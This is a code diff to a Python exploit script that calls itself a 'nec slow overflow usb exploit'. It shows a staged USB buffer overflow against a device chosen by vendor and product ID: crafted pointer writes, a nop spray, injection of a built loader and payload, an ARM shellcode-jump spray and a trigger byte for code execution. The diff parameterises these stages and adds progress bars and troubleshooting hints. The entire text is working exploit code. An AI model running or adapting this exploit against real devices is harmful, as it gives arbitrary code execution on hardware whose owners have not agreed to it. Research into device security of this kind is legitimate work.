@@ -8,6 +8,7 @@ import argparse
 import os
 import tempfile
 import subprocess
+from tqdm import tqdm
 
 
 PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
@@ -87,9 +88,18 @@ class Exploit:
         parser = argparse.ArgumentParser()
         parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
         parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
+        parser.add_argument('--stage1', type=lambda x: int(x, 16), required=True)
+        parser.add_argument('--stage1_mask', type=lambda x: int(x, 16), required=True)
+        parser.add_argument('--stage2', type=lambda x: int(x, 16), required=True)
+        parser.add_argument('--stage4', type=lambda x: int(x, 16), required=True)
+        parser.add_argument('--stage4_spam', type=lambda x: int(x, 16), required=True)
 
         self.args = parser.parse_args()
         self.build_payload()
+
+        assert self.args.stage1 % 4 == 0
+        assert self.args.stage2 % 4 == 0
+        assert self.args.stage4 % 4 == 0
 
     def build_payload(self):
         loader = PayloadBuilder("loader.S").build(base=0xDEAD0000)
@@ -97,6 +107,8 @@ class Exploit:
         loader = loader[:-4]
         payload = PayloadBuilder("payload.c").build(base=0x80000000)
         self.payload = loader + mask_payload(payload)
+        while len(self.payload) % 4 != 0:
+            self.payload += b"\x00"
 
     def write_fully(self, buffer):
         assert b"\xFE" not in buffer and b"\xFF" not in buffer
@@ -105,6 +117,10 @@ class Exploit:
             assert self.dev.write(8, chunk) == len(chunk)
 
     def run(self):
+        print("=" * 80)
+        print("nec slow overflow usb exploit")
+        print("=" * 80)
+
         self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
         if self.dev is None:
             raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))
@@ -119,73 +135,48 @@ class Exploit:
         time.sleep(3)
         self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
 
-        print("1) move writeptr behind code")
-        overflow_payload = b"\x00" * 0x273a4 + b"\xa4\x73\x02\xFD"
-        # overflow_payload = b""
-        # for x in range(0x10000):
-        #     bdata = struct.pack("<I", len(overflow_payload) | 0xFD000000)
-        #     if b"\xFF" in bdata or b"\xFE" in bdata:
-        #         bdata = b"\x42\x42\x42\x42"
-        #     overflow_payload += bdata
+        print("1) move writeptr behind buffer")
+        overflow_payload = b""
+        for x in range(self.args.stage1 // 4):
+            bdata = struct.pack("<I", len(overflow_payload) | self.args.stage1_mask)
+            if b"\xFF" in bdata or b"\xFE" in bdata:
+                bdata = b"\x42\x42\x42\x42"
+            overflow_payload += bdata
 
         self.write_fully(overflow_payload)
 
-        current = (0x80bf5934 + (0xFD0273a4)) & 0xFFFFFFFF
+        print("2) {:.2f} MB of nops".format(self.args.stage2 / 1024 / 1024))
+        with tqdm(total=self.args.stage2, unit='B', unit_scale=True, unit_divisor=1024) as bar:
+            for x in range(0, self.args.stage2, 64):
+                chunk = b"\x00" * min(64, self.args.stage2 - x)
+                assert self.dev.write(0x8, chunk) == len(chunk)
+                bar.update(len(chunk))
 
-        # now pointer is around ~0x7dc1ccd8
-
-        total = 0
-
-        megs = 40
-        print("2) {} mb of nops, current=0x{:X}".format(megs, current))
-        for x in range(0, megs * 1024 * 1024, 64):
-            chunk = b"\x00" * 64
-            assert self.dev.write(0x8, chunk) == len(chunk)
-            current += len(chunk)
-            total += len(chunk)
-
-            if total % (2 * 1024 * 1024) == 0:
-                print("wrote {} MB, current=0x{:X}".format(total / 1024 / 1024, current))
-
-        print("3) write payload at=0x{:X}".format(current))
+        print("3) write payload")
         self.write_fully(self.payload)
-        current += len(self.payload)
 
-        print("4) spam shellcode jump starting at=0x{:X}".format(current))
-        if current % 0x100 != 0:
-            chunk = b"\x00" * (0x100 - (current % 0x100))
-            self.write_fully(chunk)
-            current += len(chunk)
-        assert current % 0x100 == 0
+        print("4) spam shellcode jump")
 
         total = 0
         try:
-            while True:
-                # chunk = b"\xBB" * 64
-                chunk = b"\x02\xf1\xa0\xe3" * 16
-                assert len(chunk) == 64
-                assert self.dev.write(0x8, chunk) == len(chunk)
-                total += len(chunk)
-                current += len(chunk)
-
-                if current == 0x80b80000:
-                    break
-
-                if total % (1024 * 1024) == 0:
-                    print("wrote {} MB, current=0x{:X}".format(total / 1024 / 1024, current))
+            with tqdm(total=self.args.stage4, unit='B', unit_scale=True, unit_divisor=1024) as bar:
+                for x in range(0, self.args.stage4, 64):
+                    chunk = struct.pack("<I", self.args.stage4_spam) * 16
+                    chunk = chunk[0:min(64, self.args.stage4 - x)]
+                    self.write_fully(chunk)
+                    total += len(chunk)
+                    bar.update(len(chunk))
         except (Exception, KeyboardInterrupt):
             print("wrote before exception: 0x{:X}".format(total))
-            print("exception at current=0x{:X}".format(current))
+            print("suggestion: reduce --stage4 to under 0x{:X}, or check the screen if exploit succeeded anyway".format(total))
             raise
 
-        print("finish! current = 0x{:X}".format(current))
-        self.write_fully(b"\x00" * 0xF0)
-        # write_fully(b"\x10\x40\x2d\xe9")
-        # write_fully(b"\xFA\xFA\xFA\xFA" * 0x100)
-        self.write_fully(b"\x02\xf1\xa0\xe3" * 0x100)
-
-        # trigger code exec
-        self.dev.write(8, b"\xFE")
+        # trigger code exec (may not be required)
+        try:
+            self.dev.write(8, b"\xFE")
+        except Exception:
+            print("check the display in case exploit succeeded anyway; if not, recheck the arguments")
+            raise
 
 
 def main():
